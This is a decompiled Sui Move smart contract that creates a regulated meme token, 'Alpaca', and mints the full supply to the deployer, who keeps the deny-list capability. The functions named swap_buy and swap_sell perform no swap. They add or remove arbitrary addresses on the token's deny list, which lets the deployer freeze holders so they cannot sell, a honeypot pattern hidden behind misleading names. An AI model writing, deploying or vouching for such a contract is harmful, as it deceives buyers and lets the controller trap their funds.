module 0xbc17dd021e0100d5742d5193248ac2196c6ec77ee45d30bdf6f5d1417471021b::alpaca {
    struct ALPACA has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: ALPACA, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<ALPACA>(arg0, 9, b"Alpaca", b"Alpaca", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmTAGS8v9ADPDuvZVKVv5H8T2ZZz2kWGBhbrD6UUFhHz7u"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<ALPACA>(&mut v3, 690000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<ALPACA>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<ALPACA>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<ALPACA>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<ALPACA>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<ALPACA>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<ALPACA>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<ALPACA>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

